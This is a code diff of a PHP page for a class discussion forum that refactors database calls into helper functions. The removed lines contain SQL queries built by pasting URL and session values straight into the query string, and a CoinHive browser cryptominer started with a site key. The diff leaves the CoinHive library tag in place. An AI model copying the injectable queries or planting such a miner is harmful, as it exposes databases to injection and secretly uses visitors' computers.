@@ -20,27 +20,14 @@
   $db = getDB();
 
   //Get this class
-  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
-  $result = $db->query($query) or die($db->error);
-  $class = $result->fetch_assoc();
+  $class = getClass($db, $_GET['class']);
 
   //Check to see if student is actually in this class
-  $belongs = false;
-  $query = "SELECT class_id FROM userClasses WHERE user_id = " . $_SESSION['id'];
-  $result = $db->query($query) or die($db->error);
-  while ($class = $result->fetch_assoc()) {
-    if($_GET['class'] == $class['class_id']) {
-      //user is in this class
-      $belongs = true;
-      break;
-    }
-  }
-  if(!$belongs) {
+  if(!doesBelong($db, $_GET['class'], $_SESSION['id'])) {
     //user is not in this class
     header("Location: home.php");
     die("You shall not pass");
   }
-
 ?>
 
 <html lang="en">
@@ -50,14 +37,6 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
     <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/pages.css">
-    <script>
-      //Start miner
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
-
-    </script>
-    <!-- End questionable content -->
 
     <!-- The top banner of the webpage -->
     <div class="top">
@@ -85,10 +64,8 @@
       <?php
           echo '<div id="threads" class="container-fluid" style="overflow-y: auto;max-height: 90vh;">';
 
-          $class = $_GET['class'];
-          $query = "SELECT * FROM topics WHERE class_id = " . $class;
-          $result = $db->query($query) or die('Error querying database.');
           //Get topics
+          $result = getTopics($db, $_GET['class']);
           while ($topic = $result->fetch_assoc()) {
             echo '<div class="row">
   		              <div class="col-md-6">
